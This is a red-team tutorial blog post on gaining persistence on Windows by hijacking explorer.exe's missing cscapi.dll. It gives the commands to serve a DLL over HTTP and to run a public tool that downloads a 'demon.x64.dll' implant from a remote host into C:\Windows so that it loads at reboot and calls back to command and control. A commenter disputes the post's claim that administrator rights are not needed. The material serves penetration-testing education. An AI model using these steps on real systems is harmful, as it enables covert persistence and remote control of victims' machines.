---
title: Persistence – Explorer
url: http://pentestlab.blog/2024/03/05/persistence-explorer/
source: Over Security - Cybersecurity news aggregator
date: 2025-05-03
fetch_date: 2025-10-06T22:28:31.573164
---

# Persistence – Explorer

[Skip to content](#content)

[Penetration Testing Lab](https://pentestlab.blog/)

Offensive Techniques & Methodologies

Menu

* [Methodologies](https://pentestlab.blog/methodologies/)
  + [Red Teaming](https://pentestlab.blog/methodologies/red-teaming/)
    - [Credential Access](https://pentestlab.blog/methodologies/red-teaming/credential-access/)
    - [Persistence](https://pentestlab.blog/methodologies/red-teaming/persistence/)
* [Resources](https://pentestlab.blog/resources/)
  + [Papers](https://pentestlab.blog/resources/papers/)
    - [Web Application](https://pentestlab.blog/resources/papers/web-application/)
  + [Presentations](https://pentestlab.blog/resources/presentations/)
    - [Defcon](https://pentestlab.blog/resources/presentations/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/presentations/derbycon/)
    - [Tools](https://pentestlab.blog/resources/presentations/tools/)
  + [Videos](https://pentestlab.blog/resources/videos/)
    - [BSides](https://pentestlab.blog/resources/videos/bsides/)
    - [Defcon](https://pentestlab.blog/resources/videos/defcon/)
    - [DerbyCon](https://pentestlab.blog/resources/videos/derbycon/)
    - [Hack In Paris](https://pentestlab.blog/resources/videos/hack-in-paris/)
* [Contact](https://pentestlab.blog/contact-the-lab/)
  + [About Us](https://pentestlab.blog/contact-the-lab/about-us/)

Posted on [March 5, 2024March 3, 2024](https://pentestlab.blog/2024/03/05/persistence-explorer/)

# Persistence – Explorer

![Unknown's avatar](https://0.gravatar.com/avatar/9161b274d6d350683293f1e03d228985ac0ff6ac6c89353f4b6bd1a7bc69daf4?s=32&d=identicon&r=G) by [Administrator](https://pentestlab.blog/author/worm1984/).In [Persistence](https://pentestlab.blog/category/red-team/persistence/).[2 Comments on Persistence – Explorer](https://pentestlab.blog/2024/03/05/persistence-explorer/#comments)

Windows File Explorer is the is the graphical file management utility for the Windows operating system and the default desktop environment. Windows explorer was introduced in Windows 95 and it is associated with the process *explorer.exe*. Since this is a native Windows process it could be used in red team operations for injection of arbitrary code. Processes which are missing DLL’s are prone to [DLL Hijacking](https://pentestlab.blog/2020/03/04/persistence-dll-hijacking/). Identification of missing DLL’s is trivial and requires process monitor to filter the *explorer.exe* for results that contain *NAME NOT FOUND*. One of the missing DLL’s that *explorer.exe* is missing is the cscapi.

[![](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-process-monitor-cscapi.png?w=886)](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-process-monitor-cscapi.png)

Process Monitor – cscapi.dll

An HTTP server is required to serve the arbitrary DLL. From a Kali Linux box this is trivial by executing the following command:

```
python3 -m http.server 8080
```

[![](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-python-web-server.png?w=624)](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-python-web-server.png)

Python Web Server

A public tool has been released that will communicate with the host serving the arbitrary DLL, retrieve and write the DLL into *C:\Windows* path. The tool require the IP address and the port of the server hosting the DLL and the DLL name.

```
DLLHijacking.exe 10.0.0.3 8080 demon.x64.dll
```

[![](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-dll-hijacking.png?w=938)](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-dll-hijacking.png)

Explorer.exe – DLL Hijacking

[![](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-cscapi.png?w=1022)](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-cscapi.png)

Explorer.exe – cscapi.dll

The arbitrary DLL will load into the *explorer.exe* process on the next reboot and a communication channel with the Command and Control will established.

[![](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-implant.png?w=1024)](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-implant.png)

Explorer.exe – Implant

[![](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-host-enumeration.png?w=950)](https://pentestlab.blog/wp-content/uploads/2024/03/explorer-host-enumeration.png)

Host Enumeration

## References

1. <https://github.com/gavz/ExplorerPersist>

### Rate this:

### Share this:

* [Click to share on X (Opens in new window)
  X](https://pentestlab.blog/2024/03/05/persistence-explorer/?share=twitter)
* [Click to share on Facebook (Opens in new window)
  Facebook](https://pentestlab.blog/2024/03/05/persistence-explorer/?share=facebook)
* [Click to share on LinkedIn (Opens in new window)
  LinkedIn](https://pentestlab.blog/2024/03/05/persistence-explorer/?share=linkedin)
* [Click to share on Reddit (Opens in new window)
  Reddit](https://pentestlab.blog/2024/03/05/persistence-explorer/?share=reddit)
* [Click to share on Mastodon (Opens in new window)
  Mastodon](https://pentestlab.blog/2024/03/05/persistence-explorer/?share=mastodon)
* [Click to share on Tumblr (Opens in new window)
  Tumblr](https://pentestlab.blog/2024/03/05/persistence-explorer/?share=tumblr)
* [Click to share on WhatsApp (Opens in new window)
  WhatsApp](https://pentestlab.blog/2024/03/05/persistence-explorer/?share=jetpack-whatsapp)
* [Click to share on Telegram (Opens in new window)
  Telegram](https://pentestlab.blog/2024/03/05/persistence-explorer/?share=telegram)
* [Click to share on Pinterest (Opens in new window)
  Pinterest](https://pentestlab.blog/2024/03/05/persistence-explorer/?share=pinterest)
* [Click to share on Pocket (Opens in new window)
  Pocket](https://pentestlab.blog/2024/03/05/persistence-explorer/?share=pocket)
* Click to email a link to a friend (Opens in new window)
  Email

Like Loading...

### *Related*

[DLL Hijacking](https://pentestlab.blog/tag/dll-hijacking/)[explorer.exe](https://pentestlab.blog/tag/explorer-exe/)[Persistence](https://pentestlab.blog/tag/persistence/)[Red Team](https://pentestlab.blog/tag/red-team/)

## 2 Comments

1. ![Myron Bender's avatar](https://1.gravatar.com/avatar/daabb967f21214e7bf82bdd4b5567e8c37f68ced3af3c184f6628305fe837a27?s=50&d=identicon&r=G) **Myron Bender** says:

   [June 30, 2024 at 8:16 pm](https://pentestlab.blog/2024/03/05/persistence-explorer/#comment-66785)

   Neat technique! However, I believe you mis-marked this one with “Administrator rights not required” writing into c:windows requires Administrator privilege.

   [Reply](https://pentestlab.blog/2024/03/05/persistence-explorer/?replytocom=66785#respond)
2. ![allamannautica's avatar](https://1.gravatar.com/avatar/d0a89e3cb96bc8740285dbcbc999c57bdac16965444e6bfa3237b45d5b56ff47?s=50&d=identicon&r=G) **allamannautica** says:

   [October 8, 2024 at 5:19 pm](https://pentestlab.blog/2024/03/05/persistence-explorer/#comment-66844)

   wow!! 21Web Browser Stored Credentials

   [Reply](https://pentestlab.blog/2024/03/05/persistence-explorer/?replytocom=66844#respond)

### Leave a comment [Cancel reply](/2024/03/05/persistence-explorer/#respond)

Δ

## Post navigation

[Previous Previous post: Persistence – Visual Studio Code Extensions](https://pentestlab.blog/2024/03/04/persistence-visual-studio-code-extensions/)

[Next Next post: Persistence – DLL Proxy Loading](https://pentestlab.blog/2024/04/03/persistence-dll-proxy-loading/)

## Support pentestlab.blog

Pentestlab.blog has a long term history in the offensive security space by delivering content for over a decade. Articles discussed in pentestlab.blog have been used by cyber security professionals and red teamers for their day to day job and by students and lecturers in academia. If you have benefit by the content all these years and you would like to support us on the maintenance costs please consider a donation.

One-Time

Monthly

Yearly

#### Make a one-time donation

#### Make a monthly donation

#### Make a ...